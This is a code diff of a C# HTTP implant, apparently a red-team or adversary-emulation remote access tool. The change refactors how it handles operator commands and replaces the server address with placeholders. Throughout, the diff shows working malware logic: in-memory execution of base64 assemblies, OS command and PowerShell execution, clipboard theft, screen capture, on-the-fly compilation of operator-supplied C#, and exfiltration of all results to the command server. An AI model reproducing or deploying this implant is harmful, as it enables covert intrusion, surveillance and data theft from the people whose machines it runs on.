@@ -42,15 +42,16 @@ namespace HTTPImplant
     public class Implant
     {
         public static Victim victim = new Victim();
-        public static string host = "localhost";  // Host of the implant server
-        public static string port = "8081"; // Port of the implant server
+        public static string host = "<IP>";  // Host of the implant server
+        public static string port = "<PORT>"; // Port of the implant server
         private static string lastCommandExecuted = string.Empty; // Store the last command that was executed
         public static bool SMB = false;
         private static bool usesmb;
 
         public static void Main(string[] args)
         {
-            /*Powerless.Exec("whoami");
+/*            string output = Powerless.Exec(args[0]);
+            Console.WriteLine(output);
             Environment.Exit(0);*/
             /*ClipboardFetcher.GetData();
             Environment.Exit(0);*/
@@ -103,14 +104,32 @@ namespace HTTPImplant
 
                         Command command = new Command();
                         command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
+                        /*Console.WriteLine("Input: " + command.Input);
+*/
                         command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\",\"Args" }, StringSplitOptions.None)[1];
+                        /*Console.WriteLine("Command: " + command.command);
+*/
                         command.Args = jsonResponse.Split(new string[] { "\"Args\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
+                        /*Console.WriteLine("Args: " + command.Args);
+*/
                         command.ImplantUser = jsonResponse.Split(new string[] { "\"ImplantUser\":\"", "\",\"Operator" }, StringSplitOptions.None)[1];
+                        /*Console.WriteLine("ImplantUser: " + command.ImplantUser);
+*/
                         command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
+                        /*Console.WriteLine("Operator: " + command.Operator);
+*/
                         command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
+                        /*Console.WriteLine("Delay: " + command.Delay);
+*/
                         command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"File" }, StringSplitOptions.None)[1];
+                        /*Console.WriteLine("TimeToExec: " + command.TimeToExec);
+*/
                         command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"usesmb" }, StringSplitOptions.None)[1];
+                        /*Console.WriteLine("File: " + command.File);
+*/
                         command.usesmb = jsonResponse.Split(new string[] { "\"usesmb\":\"", "\"}" }, StringSplitOptions.None)[1];
+/*                        Console.WriteLine("usesmb: " + command.usesmb);*/
+
 
                         if (!bool.TryParse(command.usesmb, out usesmb))
 
@@ -142,85 +161,93 @@ namespace HTTPImplant
                                 // Update lastCommandExecuted
                                 lastCommandExecuted = command.Input;
 
-                                if (command.Input.Trim().Equals("execute-assembly", StringComparison.OrdinalIgnoreCase))
+                                string inputCommand = command.Input.Trim().ToLower();
+                                switch (inputCommand)
                                 {
-                                    Console.WriteLine("Running assembly");
-                                    byte[] bytes = Convert.FromBase64String(command.File);
-                                    string output = ExecuteAssembly.Execute(bytes);
-                                    string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
-                                    Console.WriteLine(output);
-                                    await SendResult(webClient, implantId, command.Operator, outputBase64, SMB);
-                                }
-                                else if (command.Input.Trim().Equals("os", StringComparison.OrdinalIgnoreCase))
-                                {
-                                    Console.WriteLine("Running command: " + command.command);
-                                    string output = Commands.command(command.command, command.Args);
-                                    string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
-                                    await SendResult(webClient, implantId, command.Operator, outputBase64, SMB);
-                                }
-                                else if (command.Input.Trim().Equals("clip", StringComparison.OrdinalIgnoreCase))
-                                {
-                                    Console.WriteLine("Running clipboard fetcher... ");
-                                    string output = ClipboardFetcher.GetData();
-                                    string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
-                                    await SendResult(webClient, implantId, command.Operator, outputBase64, SMB);
-                                }
-                                else if (command.Input.Trim().Equals("screengrab", StringComparison.OrdinalIgnoreCase))
-                                {
-                                    Console.WriteLine("Running screen fetcher... ");
-                                    string output = ScreenGrab.CaptureScreen();
-                                    await SendResult(webClient, implantId, command.Operator, output, SMB);
-                                }
-                                else if (command.Input.Trim().Equals("powerless", StringComparison.OrdinalIgnoreCase))
-                                {
-                                    Console.WriteLine("Running powerless command: " + command.command);
-                                    string output = Powerless.Exec(command.command);
-                                    string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
-                                    Console.WriteLine(outputBase64);
-                                    await SendResult(webClient, implantId, command.Operator, output, SMB);
-                                }
-                                else if (command.Input.Trim().Equals("loadcs", StringComparison.OrdinalIgnoreCase))
-                                {
-                                    Console.WriteLine("Attempting to Compile and Run .NET C# Code...");
-                                    try
-                                    {
-                                        string sourceCode = "using System;\n\nclass Program {\n    public static void Main()\n    {\n        Console.WriteLine(\"Hello Adversary Emulator Program\");\n    }\n}";
+                                    case "execute-assembly":
+                                        Console.WriteLine("Running assembly");
+                                        byte[] bytes = Convert.FromBase64String(command.File);
+                                        string outputAssembly = ExecuteAssembly.Execute(bytes);
+                                        string outputBase64Assembly = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputAssembly));
+                                        Console.WriteLine(outputAssembly);
+                                        await SendResult(webClient, implantId, command.Operator, outputBase64Assembly, SMB);
+                                        break;
 
-                                        string encodedSourceCode = command.File;
+                                    case "os":
+                                        Console.WriteLine("Running command: " + command.command);
+                                        string outputOS = Commands.command(command.command, command.Args);
+                                        string outputBase64OS = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputOS));
+                                        await SendResult(webClient, implantId, command.Operator, outputBase64OS, SMB);
+                                        break;
 
-                                        Console.WriteLine("Encoded Source Code: \n" + encodedSourceCode);
+                                    case "clip":
+                                        Console.WriteLine("Running clipboard fetcher... ");
+                                        string outputClip = ClipboardFetcher.GetData();
+                                        string outputBase64Clip = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputClip));
+                                        await SendResult(webClient, implantId, command.Operator, outputBase64Clip, SMB);
+                                        break;
 
-                                        byte[] code = Convert.FromBase64String(encodedSourceCode);
-                                        string decodedSourceCode = Encoding.UTF8.GetString(code);
+                                    case "screengrab":
+                                        Console.WriteLine("Running screen fetcher... ");
+                                        string outputScreen = ScreenGrab.CaptureScreen();
+                                        await SendResult(webClient, implantId, command.Operator, outputScreen, SMB);
+                                        break;
 
-                                        Console.WriteLine("Decoded Source Code: \n" + decodedSourceCode);
+                                    case "powerless":
+                                        string outputPowerless = Powerless.Exec("Get-Process");
+                                        Console.WriteLine(outputPowerless);
+                                        string outputBase64Powerless = Convert.ToBase64String(Encoding.UTF8.GetBytes(outputPowerless));
+                                        Console.WriteLine(outputBase64Powerless);
+                                        await SendResult(webClient, implantId, command.Operator, outputPowerless, SMB);
+                                        break;
 
-                                        // Compare the strings character by character
-                                        for (int i = 0; i < Math.Min(sourceCode.Length, decodedSourceCode.Length); i++)
+                                    case "loadcs":
+                                        Console.WriteLine("Attempting to Compile and Run .NET C# Code...");
+                                        try
                                         {
-                                            if (sourceCode[i] != decodedSourceCode[i])
+                                            string sourceCode = "using System;\n\nclass Program {\n    public static void Main()\n    {\n        Console.WriteLine(\"Hello Adversary Emulator Program\");\n    }\n}";
+
+                                            string encodedSourceCode = command.File;
+
+                                            Console.WriteLine("Encoded Source Code: \n" + encodedSourceCode);
+
+                                            byte[] code = Convert.FromBase64String(encodedSourceCode);
+                                            string decodedSourceCode = Encoding.UTF8.GetString(code);
+
+                                            Console.WriteLine("Decoded Source Code: \n" + decodedSourceCode);
+
+                                            // Compare the strings character by character
+                                            for (int i = 0; i < Math.Min(sourceCode.Length, decodedSourceCode.Length); i++)
                                             {
-                                                Console.WriteLine($"Difference at position {i}: '{sourceCode[i]}' != '{decodedSourceCode[i]}'");
-                                                break;
+                                                if (sourceCode[i] != decodedSourceCode[i])
+                                                {
+                                                    Console.WriteLine($"Difference at position {i}: '{sourceCode[i]}' != '{decodedSourceCode[i]}'");
+                                                    break;
+                                                }
                                             }
-                                        }
 
-                                        if (sourceCode.Length != decodedSourceCode.Length)
+                                            if (sourceCode.Length != decodedSourceCode.Length)
+                                            {
+                                                Console.WriteLine($"Length mismatch: sourceCode Length = {sourceCode.Length}, decodedSourceCode Length = {decodedSourceCode.Length}");
+                                            }
+
+                                            CompileAndRunNET.ExecuteCS(decodedSourceCode);
+                                        }
+                                        catch (Exception ex)
                                         {
-                                            Console.WriteLine($"Length mismatch: sourceCode Length = {sourceCode.Length}, decodedSourceCode Length = {decodedSourceCode.Length}");
+                                            Console.WriteLine("Exception caught: " + ex.ToString());
                                         }
+                                        break;
 
-                                        CompileAndRunNET.ExecuteCS(decodedSourceCode);
-                                    }
-                                    catch (Exception ex)
-                                    {
-                                        Console.WriteLine("Exception caught: " + ex.ToString());
-                                    }
-                                }
-                                else if (command.Input.Trim().Equals("upload", StringComparison.OrdinalIgnoreCase))
-                                {
+                                    case "upload":
+                                        // The code for "upload" command goes here
+                                        break;
 
+                                    default:
+                                        Console.WriteLine("Unknown command: " + inputCommand);
+                                        break;
                                 }
+
                             } while (command.Input != lastCommandExecuted);
                         }
                         else
